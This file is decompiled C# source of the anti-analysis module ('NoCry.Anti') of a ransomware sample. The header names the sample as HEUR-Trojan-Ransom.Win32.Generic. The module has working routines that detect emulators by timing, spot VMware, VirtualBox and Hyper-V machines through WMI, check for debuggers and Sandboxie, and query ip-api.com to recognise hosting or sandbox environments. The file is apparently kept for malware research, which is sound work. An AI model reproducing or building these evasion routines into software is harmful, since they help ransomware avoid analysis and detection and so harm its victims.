// Decompiled with JetBrains decompiler
// Type: NoCry.Anti
// Assembly: NoCry, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BD7384EC-1348-457C-BEC6-7E1381E8F337
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.Win32.Generic-67f972536102feb9b3de184c34d9f8b1114c1c38ab3fbb15bb0419043f68a913.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

namespace NoCry
{
  [StandardModule]
  internal sealed class Anti
  {
    public static bool Emulator()
    {
      try
      {
        DateTime now = DateTime.Now;
        long ticks = now.Ticks;
        Thread.Sleep(10);
        now = DateTime.Now;
        if (checked (now.Ticks - ticks) < 10L)
          return true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return false;
    }

    public static bool DetectVirtualMachine()
    {
      using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
      {
        using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
        {
          try
          {
            foreach (ManagementBaseObject managementBaseObject in objectCollection)
            {
              string lower = managementBaseObject["Manufacturer"].ToString().ToLower();
              if (Operators.CompareString(lower, "microsoft corporation", false) == 0 && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL") || lower.Contains("vmware") || Operators.CompareString(managementBaseObject["Model"].ToString(), "VirtualBox", false) == 0)
                return true;
            }
          }
          finally
          {
            ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator;
            objectEnumerator?.Dispose();
          }
        }
      }
      return false;
    }

    public static bool DetectDebugger()
    {
      bool isDebuggerPresent = false;
      Anti.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
      return isDebuggerPresent;
    }

    public static bool DetectSandboxie() => Anti.GetModuleHandle("SbieDll.dll").ToInt32() != 0;

    public static bool anyrun()
    {
      try
      {
        return new WebClient().DownloadString("http://ip-api.com/line/?fields=hosting").Contains("true");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return false;
    }

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CheckRemoteDebuggerPresent(
      IntPtr hProcess,
      ref bool isDebuggerPresent);
  }
}
